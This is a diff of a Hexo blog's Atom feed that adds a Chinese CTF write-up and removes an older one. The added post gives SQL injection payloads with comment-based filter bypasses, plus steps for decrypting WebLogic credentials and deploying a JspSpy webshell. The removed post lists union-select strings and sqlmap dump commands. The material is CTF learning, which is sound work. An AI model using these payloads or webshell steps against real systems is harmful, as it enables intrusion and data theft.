@@ -6,7 +6,7 @@
   <link href="http://haorical.xyz/atom.xml" rel="self"/>
   
   <link href="http://haorical.xyz/"/>
-  <updated>2021-10-11T15:56:40.461Z</updated>
+  <updated>2021-10-13T13:56:34.993Z</updated>
   <id>http://haorical.xyz/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>国庆赛部分赛题复现</title>
+    <link href="http://haorical.xyz/posts/bfdb9200/"/>
+    <id>http://haorical.xyz/posts/bfdb9200/</id>
+    <published>2021-10-13T11:05:32.000Z</published>
+    <updated>2021-10-13T13:56:34.993Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote><p>环境有点问题，复现一半出不来了</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flagisHere.flAg</span><br></pre></td></tr></table></figure><h3 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h3><p>按照wp的反弹shell没打通</p><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><p>这个题学到的挺多的</p><p>先通过任意文件读取漏洞获得密钥和密文</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;config&#x2F;config.xml</span><br><span class="line">.&#x2F;security&#x2F;SerializedSystemIni.dat</span><br></pre></td></tr></table></figure><p>然后用这个<a href="https://github.com/TideSec/Decrypt_Weblogic_Password">https://github.com/TideSec/Decrypt_Weblogic_Password</a>文章中提到的，获得密码，登入后台，部署木马。</p><p>war木马，就是将jsp木马压缩成zip，然后改后缀就行，这里把war部署到服务器上。</p><p>访问大马文件<a href="http://host/test/JspSpy.jsp">http://host/test/JspSpy.jsp</a></p><p>找到个flag.tar，结果我解压的时候给破坏了，现在服务器里没flag了，它这个是所有人一个环境，后面复现的人得多少有点懵逼，所以：</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20211013215350.png"></p><p>我在根目录里面创建了个假的flag（哈哈哈，逃</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;sql2&quot;&gt;&lt;a href=&quot;#sql2&quot; class=&quot;headerlink&quot; title=&quot;sql2&quot;&gt;&lt;/a&gt;sql</summary>
+      
+    
+    
+    
+    <category term="ctf学习" scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
+    
+    
+    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
+    
+    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
+    
+    <category term="sql注入" scheme="http://haorical.xyz/tags/sql%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
   
   <entry>
     <title>2021秋季赛部分wp</title>
@@ -416,9 +444,9 @@
     
     <category term="sql注入" scheme="http://haorical.xyz/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
-    <category term="文件上传" scheme="http://haorical.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
     <category term="代码审计" scheme="http://haorical.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    <category term="文件上传" scheme="http://haorical.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     
   </entry>
   
@@ -533,32 +561,6 @@
     
     
     <category term="python" scheme="http://haorical.xyz/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>202108203</title>
-    <link href="http://haorical.xyz/posts/401ec127/"/>
-    <id>http://haorical.xyz/posts/401ec127/</id>
-    <published>2021-08-20T15:05:08.000Z</published>
-    <updated>2021-08-26T17:42:22.897Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and 0 union select 1,2,3 #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,TABLE_SCHEMA,TABLE_NAME <span class="keyword">from</span> INFORMATION_SCHEMA.COLUMNS 表 表名</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; and 0 union select 1,column_name,data_type from information_schema.columns where table_name=&#x27;</span>secret_table<span class="string">&#x27;# 列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,fl4g <span class="keyword">from</span> secret_table #</span><br></pre></td></tr></table></figure><p>查找显示位</p><pre><code>1&#39; order by 3 #1&#39; union select 1,2,3#</code></pre><h1 id="sqlmap用法"><a href="#sqlmap用法" class="headerlink" title="sqlmap用法"></a>sqlmap用法</h1><h2 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h2><p>用bp抓包后，copy files到sqlmap目录</p><p>使用方法</p><pre><code>python3 sqlmap.py -r 1.txt</code></pre><p>查看所有数据库</p><pre><code>python3 sqlmap.py -r 1.txt --dbs</code></pre><p>查看库下表</p><pre><code>python3 sqlmap.py -r 1.txt -D news --tables</code></pre><p>查看表下列</p><pre><code>python3 sqlmap.py -r 1.txt -D news -T secret_table --columns</code></pre><p>查看列下内容</p><pre><code>python3 sqlmap.py -r 1.txt -D news -T secret_table -C fl4g --dump</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;NewsCenter&quot;&gt;&lt;a href=&quot;#NewsCenter&quot; class=&quot;headerlink&quot; title=&quot;NewsCenter&quot;&gt;&lt;/a&gt;NewsCenter&lt;/h1&gt;&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;</summary>
-      
-    
-    
-    
-    <category term="ctf每日一题" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
-    
-    
-    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
-    
-    <category term="sql注入" scheme="http://haorical.xyz/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
